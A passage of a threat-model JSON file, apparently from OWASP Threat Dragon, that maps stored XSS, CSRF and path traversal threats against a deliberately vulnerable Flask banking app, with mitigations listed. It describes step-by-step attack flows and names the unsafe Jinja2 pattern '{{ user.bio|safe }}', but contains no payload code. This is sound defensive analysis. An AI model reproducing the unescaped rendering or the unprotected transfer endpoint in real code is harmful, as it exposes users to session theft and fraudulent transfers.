              "name": "STORED CROSS-SITE SCRIPTING (XSS) ATTACK - PROFILE BIO FIELD\n\nATTACK TYPE: Stored XSS (Type 2) - Most Dangerous\nSEVERITY: HIGH | CVSS Score: 8.8\nSTRIDE: Tampering, Information Disclosure\nOWASP Top 10: A03:2021 - Injection\n\nATTACK SUMMARY:\n1. Attacker creates account and submits malicious JavaScript in bio field\n2. Application stores script in database without sanitization\n3. Victim (admin) views attacker's profile\n4. Application renders bio with |safe filter (no escaping)\n5. Victim's browser executes malicious script\n6. Script steals victim's session cookie\n7. Attacker hijacks admin session\n\nAFFECTED COMPONENT: Flask Profile Route (/profile)\nVULNERABLE CODE: {{ user.bio|safe }} in Jinja2 template\nROOT CAUSE: Lack of input sanitization + unsafe output rendering",
              "hasOpenThreats": false
            }
          },
          {
            "position": {
              "x": 1440.9999999999911,
              "y": 95
            },
            "size": {
              "width": 370,
              "height": 530
            },
            "attrs": {
              "text": {
                "text": "IMPACT ANALYSIS - XSS ATTACK\n\nCONFIDENTIALITY: CRITICAL\n- Session cookie theft → Account takeover\n- Access to all user PII (SSN, DOB, addresses)\n- View transaction history of all customers\n- Access admin credentials and API keys\n\nINTEGRITY: CRITICAL\n- Modify account balances\n- Create fraudulent transactions\n- Inject persistent backdoors\n- Alter audit logs to hide traces\n- Deface website for all users\n\nAVAILABILITY: MEDIUM\n- Redirect users to phishing sites\n- Crash browsers with infinite loops\n- Resource exhaustion (crypto mining)\n\nCOMPLIANCE VIOLATIONS:\n- PCI-DSS 6.5.7 (XSS prevention required)\n- GDPR Article 32 (security of processing)\n- SOC 2 CC6.1 (logical access controls)\n\nFINANCIAL IMPACT:\n- Direct theft via unauthorized transfers\n- Regulatory fines: up to $50M (GDPR)\n- Class action lawsuits\n- Reputation damage\n- Customer churn\n- Incident response costs\n\nATTACK PERSISTENCE:\nUnlike Reflected XSS, Stored XSS persists in database\nAffects ALL users who view the malicious profile\nRequires manual database cleanup"
              }
            },
            "visible": true,
            "shape": "td-text-block",
            "id": "4093fb67-29ba-4b3e-8806-11ccfda63843",
            "zIndex": 12,
            "data": {
              "type": "tm.Text",
              "name": "IMPACT ANALYSIS - XSS ATTACK\n\nCONFIDENTIALITY: CRITICAL\n- Session cookie theft → Account takeover\n- Access to all user PII (SSN, DOB, addresses)\n- View transaction history of all customers\n- Access admin credentials and API keys\n\nINTEGRITY: CRITICAL\n- Modify account balances\n- Create fraudulent transactions\n- Inject persistent backdoors\n- Alter audit logs to hide traces\n- Deface website for all users\n\nAVAILABILITY: MEDIUM\n- Redirect users to phishing sites\n- Crash browsers with infinite loops\n- Resource exhaustion (crypto mining)\n\nCOMPLIANCE VIOLATIONS:\n- PCI-DSS 6.5.7 (XSS prevention required)\n- GDPR Article 32 (security of processing)\n- SOC 2 CC6.1 (logical access controls)\n\nFINANCIAL IMPACT:\n- Direct theft via unauthorized transfers\n- Regulatory fines: up to $50M (GDPR)\n- Class action lawsuits\n- Reputation damage\n- Customer churn\n- Incident response costs\n\nATTACK PERSISTENCE:\nUnlike Reflected XSS, Stored XSS persists in database\nAffects ALL users who view the malicious profile\nRequires manual database cleanup",
              "hasOpenThreats": false
            }
          }
        ]
      },
      {
        "id": 3,
        "title": "CROSS-SITE REQUEST FORGERY (CSRF) ATTACK THREAT MODEL",
        "diagramType": "STRIDE",
        "placeholder": "New STRIDE diagram description",
        "thumbnail": "./public/content/images/thumbnail.stride.jpg",
        "version": "2.5.0",
        "cells": [
          {
            "position": {
              "x": 840,
              "y": -10
            },
            "size": {
              "width": 690,
              "height": 400
            },
            "attrs": {
              "label": {
                "text": "Banking Application Domain"
              }
            },
            "visible": true,
            "shape": "trust-boundary-box",
            "id": "77773cec-3cea-4059-b1eb-182bdbcfddcb",
            "zIndex": -1,
            "data": {
              "type": "tm.BoundaryBox",
              "name": "Banking Application Domain",
              "description": "",
              "isTrustBoundary": true,
              "hasOpenThreats": false
            }
          },
          {
            "position": {
              "x": 490,
              "y": 290
            },
            "size": {
              "width": 112.5,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "Victim User"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "actor",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "5b8a5075-badb-4a46-8877-d8ec5ceb3a08"
                },
                {
                  "group": "right",
                  "id": "f3c5e5e5-d5c8-4d6f-8894-6038c0cf4d3f"
                },
                {
                  "group": "bottom",
                  "id": "45d2749b-1bc8-4832-83c0-8dca85db24e5"
                },
                {
                  "group": "left",
                  "id": "adc56313-d73f-4abe-a982-c9565ecf7ac6"
                }
              ]
            },
            "id": "ea181300-be87-4335-a088-884fb06a3399",
            "zIndex": 1,
            "data": {
              "type": "tm.Actor",
              "name": "Victim User",
              "description": "Authenticated user with active session",
              "isTrustBoundary": false,
              "outOfScope": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "providesAuthentication": false,
              "threats": []
            }
          },
          {
            "position": {
              "x": 490,
              "y": 70
            },
            "size": {
              "width": 112.5,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "Attacker"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "actor",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "5b8a5075-badb-4a46-8877-d8ec5ceb3a08"
                },
                {
                  "group": "right",
                  "id": "f3c5e5e5-d5c8-4d6f-8894-6038c0cf4d3f"
                },
                {
                  "group": "bottom",
                  "id": "45d2749b-1bc8-4832-83c0-8dca85db24e5"
                },
                {
                  "group": "left",
                  "id": "adc56313-d73f-4abe-a982-c9565ecf7ac6"
                }
              ]
            },
            "id": "e72b91a3-d447-4218-90a7-2bec356c97d6",
            "zIndex": 2,
            "data": {
              "type": "tm.Actor",
              "name": "Attacker",
              "description": "Malicious actor hosting CSRF attack",
              "isTrustBoundary": false,
              "outOfScope": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "providesAuthentication": false,
              "threats": []
            }
          },
          {
            "position": {
              "x": 220,
              "y": 155
            },
            "size": {
              "width": 140,
              "height": 130
            },
            "attrs": {
              "text": {
                "text": "Malicious Website"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "process",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "da2f912e-57e5-48b7-b6e1-bfbf15cfdda5"
                },
                {
                  "group": "right",
                  "id": "ff0621b7-482a-4d9d-baf9-0150d6d8bcaa"
                },
                {
                  "group": "bottom",
                  "id": "2e5b19eb-3399-4e8c-b94f-69e6542c6857"
                },
                {
                  "group": "left",
                  "id": "1ca8220b-4139-42b2-981c-0bb075f9dc3b"
                }
              ]
            },
            "id": "607fe344-ce46-4886-88ce-ce03a3beaa54",
            "zIndex": 3,
            "data": {
              "type": "tm.Process",
              "name": "Malicious Website",
              "description": "External site hosting csrf_attack.html",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "handlesCardPayment": false,
              "handlesGoodsOrServices": false,
              "isWebApplication": true,
              "privilegeLevel": "Low",
              "threats": []
            }
          },
          {
            "position": {
              "x": 865,
              "y": 80
            },
            "size": {
              "width": 300,
              "height": 300
            },
            "attrs": {
              "text": {
                "text": "Flask Web Application - Transfer Route"
              },
              "body": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "process",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "da2f912e-57e5-48b7-b6e1-bfbf15cfdda5"
                },
                {
                  "group": "right",
                  "id": "ff0621b7-482a-4d9d-baf9-0150d6d8bcaa"
                },
                {
                  "group": "bottom",
                  "id": "2e5b19eb-3399-4e8c-b94f-69e6542c6857"
                },
                {
                  "group": "left",
                  "id": "1ca8220b-4139-42b2-981c-0bb075f9dc3b"
                }
              ]
            },
            "id": "de795f34-9b90-4b2e-83b2-31204ae32d09",
            "zIndex": 4,
            "data": {
              "type": "tm.Process",
              "name": "Flask Web Application - Transfer Route",
              "description": "/transfer endpoint (POST)",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "handlesCardPayment": false,
              "handlesGoodsOrServices": false,
              "isWebApplication": false,
              "privilegeLevel": "High",
              "threats": [
                {
                  "id": "9979689e-5e9f-46d6-9229-5ae25b5f2d76",
                  "title": "Missing CSRF Protection",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "The /transfer endpoint does not validate CSRF tokens, making it \nvulnerable to cross-origin request forgery attacks.",
                  "mitigation": "- Implement Flask-WTF with CSRF protection\n- Generate unique tokens per session\n- Validate tokens on all state-changing operations",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 16,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "spoofing": 0,
                "tampering": 1,
                "repudiation": 0,
                "informationDisclosure": 0,
                "denialOfService": 0,
                "elevationOfPrivilege": 0
              }
            }
          },
          {
            "position": {
              "x": 1390,
              "y": 190
            },
            "size": {
              "width": 120,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "SQLite Database"
              },
              "topLine": {
                "strokeWidth": 1.5,
                "strokeDasharray": null
              },
              "bottomLine": {
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "store",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "feec98df-c221-47b3-84aa-c8ac66450bdd"
                },
                {
                  "group": "right",
                  "id": "f983cec2-bc0c-4fee-9d66-b3189032083d"
                },
                {
                  "group": "bottom",
                  "id": "f1108c1c-0244-4357-9a96-f14348fdde91"
                },
                {
                  "group": "left",
                  "id": "3bb1aba0-761d-4e13-8e46-2fc2c29f984f"
                }
              ]
            },
            "id": "35d3e0ba-0f06-47c5-b598-59ec8849642c",
            "zIndex": 5,
            "data": {
              "type": "tm.Store",
              "name": "SQLite Database",
              "description": "Contains accounts and transactions tables",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isALog": false,
              "isEncrypted": false,
              "isSigned": false,
              "storesCredentials": false,
              "storesInventory": false,
              "threats": []
            }
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP POST (Login)",
              "description": "User authenticates and receives session cookie",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "HTTPS",
              "threats": []
            },
            "labels": [
              "HTTP POST (Login)"
            ],
            "id": "46693bc1-8bf3-4901-b08f-32f57435b41f",
            "source": {
              "cell": "ea181300-be87-4335-a088-884fb06a3399",
              "port": "f3c5e5e5-d5c8-4d6f-8894-6038c0cf4d3f"
            },
            "target": {
              "cell": "de795f34-9b90-4b2e-83b2-31204ae32d09",
              "port": "1ca8220b-4139-42b2-981c-0bb075f9dc3b"
            },
            "vertices": [
              {
                "x": 720,
                "y": 230
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP GET (Visit Site)",
              "description": "User visits attacker's website",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "HTTP",
              "threats": []
            },
            "labels": [
              "HTTP GET (Visit Site)"
            ],
            "id": "13630d47-b07d-45e5-819b-db266c0f2e0c",
            "source": {
              "cell": "ea181300-be87-4335-a088-884fb06a3399",
              "port": "adc56313-d73f-4abe-a982-c9565ecf7ac6"
            },
            "target": {
              "cell": "607fe344-ce46-4886-88ce-ce03a3beaa54",
              "port": "2e5b19eb-3399-4e8c-b94f-69e6542c6857"
            },
            "vertices": []
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Malicious HTML Page",
              "description": "Page contains form targeting /transfer endpoint",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "Malicious HTML Page"
            ],
            "id": "b54c40a7-95a7-4bfc-975d-e532c5e3d736",
            "source": {
              "cell": "607fe344-ce46-4886-88ce-ce03a3beaa54",
              "port": "ff0621b7-482a-4d9d-baf9-0150d6d8bcaa"
            },
            "target": {
              "cell": "ea181300-be87-4335-a088-884fb06a3399",
              "port": "5b8a5075-badb-4a46-8877-d8ec5ceb3a08"
            },
            "vertices": []
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP POST (CSRF Attack)",
              "description": "CROSS-ORIGIN REQUEST with valid session cookie",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "This is the CSRF vulnerability",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "HTTP",
              "threats": [
                {
                  "id": "a41e6e6a-83f7-449c-b831-c23bda3d456e",
                  "title": "Cross-Site Request Forgery (CSRF) in Money Transfer",
                  "status": "Open",
                  "severity": "TBD",
                  "type": "",
                  "description": "Description: \nAttacker tricks authenticated user into making unauthorized money \ntransfers by exploiting browser's automatic cookie inclusion in \ncross-origin requests. The /transfer endpoint does not validate \nCSRF tokens, allowing malicious websites to forge requests.\n\nAttack Scenario:\n1. Victim logs into banking app (session cookie stored)\n2. Victim visits attacker's malicious website\n3. Malicious page auto-submits hidden form to /transfer\n4. Browser automatically includes session cookie\n5. Flask accepts request as legitimate (valid session)\n6. Money transferred without user's consent",
                  "mitigation": "Mitigation:\n- Implement CSRF tokens (Synchronizer Token Pattern)\n- Set SameSite cookie attribute (SameSite=Strict or Lax)\n- Validate Referer/Origin headers\n- Use double-submit cookie pattern\n- Require re-authentication for sensitive operations",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 17,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 0,
                "informationDisclosure": 0,
                "denialOfService": 0
              }
            },
            "labels": [
              "HTTP POST (CSRF Attack)"
            ],
            "id": "9be9f830-18ed-4be0-bdb4-5a0abfb15e48",
            "source": {
              "cell": "ea181300-be87-4335-a088-884fb06a3399",
              "port": "f3c5e5e5-d5c8-4d6f-8894-6038c0cf4d3f"
            },
            "target": {
              "cell": "de795f34-9b90-4b2e-83b2-31204ae32d09",
              "port": "1ca8220b-4139-42b2-981c-0bb075f9dc3b"
            },
            "vertices": [
              {
                "x": 750,
                "y": 320
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "SQL Operations",
              "description": "",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "SQL",
              "threats": []
            },
            "labels": [
              "SQL Operations"
            ],
            "id": "add0f1bf-37fc-4f5b-92d1-221e97c895ff",
            "source": {
              "cell": "de795f34-9b90-4b2e-83b2-31204ae32d09",
              "port": "ff0621b7-482a-4d9d-baf9-0150d6d8bcaa"
            },
            "target": {
              "cell": "35d3e0ba-0f06-47c5-b598-59ec8849642c",
              "port": "3bb1aba0-761d-4e13-8e46-2fc2c29f984f"
            },
            "vertices": []
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP Response",
              "description": "Transfer completed without user knowledge",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "HTTP Response"
            ],
            "id": "34c2ddcd-ac9d-4011-81f6-aed1c284fcad",
            "source": {
              "cell": "de795f34-9b90-4b2e-83b2-31204ae32d09",
              "port": "2e5b19eb-3399-4e8c-b94f-69e6542c6857"
            },
            "target": {
              "cell": "ea181300-be87-4335-a088-884fb06a3399",
              "port": "45d2749b-1bc8-4832-83c0-8dca85db24e5"
            },
            "vertices": [
              {
                "x": 770,
                "y": 380
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Setup Malicious Site",
              "description": "Attacker creates and hosts malicious website with CSRF exploit",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "HTTPS",
              "threats": []
            },
            "labels": [
              "Setup Malicious Site"
            ],
            "id": "75db752b-f3a0-4f4c-bdda-4e6b00378559",
            "source": {
              "cell": "e72b91a3-d447-4218-90a7-2bec356c97d6",
              "port": "adc56313-d73f-4abe-a982-c9565ecf7ac6"
            },
            "target": {
              "cell": "607fe344-ce46-4886-88ce-ce03a3beaa54",
              "port": "da2f912e-57e5-48b7-b6e1-bfbf15cfdda5"
            },
            "vertices": []
          },
          {
            "position": {
              "x": 840,
              "y": 390
            },
            "size": {
              "width": 460,
              "height": 80
            },
            "attrs": {
              "text": {
                "text": "CRITICAL VULNERABILITY:\nThe /transfer endpoint accepts requests without CSRF token validation.\nBrowser automatically includes session cookies in cross-origin requests,\nallowing attackers to forge legitimate-looking requests."
              }
            },
            "visible": true,
            "shape": "td-text-block",
            "id": "fabfffc4-b6ed-4c9a-8f12-88cbbe0558a5",
            "zIndex": 11,
            "data": {
              "type": "tm.Text",
              "name": "CRITICAL VULNERABILITY:\nThe /transfer endpoint accepts requests without CSRF token validation.\nBrowser automatically includes session cookies in cross-origin requests,\nallowing attackers to forge legitimate-looking requests.",
              "hasOpenThreats": false
            }
          }
        ]
      },
      {
        "id": 4,
        "title": "PATH TRAVERSAL Attack Threat Model ",
        "diagramType": "STRIDE",
        "placeholder": "New STRIDE diagram description",
        "thumbnail": "./public/content/images/thumbnail.stride.jpg",
        "version": "2.5.0",
        "cells": [
          {
            "position": {
              "x": 440,
              "y": 120
            },
            "size": {
              "width": 112.5,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "Attacker"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "actor",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "32b4d171-260c-4012-b7b0-ad739a9af218"
                },
                {
                  "group": "right",
                  "id": "9331e896-afde-462d-be7a-1edf32b7306f"
                },
                {
                  "group": "bottom",
                  "id": "17ae65ec-70a8-40d5-8a23-6c34c8b4ac7b"
                },
                {
                  "group": "left",
                  "id": "cb5d5340-7de9-4998-b95d-f835f74cfdce"
                }
              ]
            },
            "id": "ee721b49-fc3a-47fb-a60c-f48a31bdfdca",
            "zIndex": 1,
            "data": {
              "type": "tm.Actor",
              "name": "Attacker",
              "description": "Authenticated user exploiting download endpoint",
              "isTrustBoundary": false,
              "outOfScope": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "providesAuthentication": false,
              "threats": []
            }
          }
        ]
      }
    ],
    "diagramTop": 5,
    "reviewer": "",
    "threatTop": 17
  }
}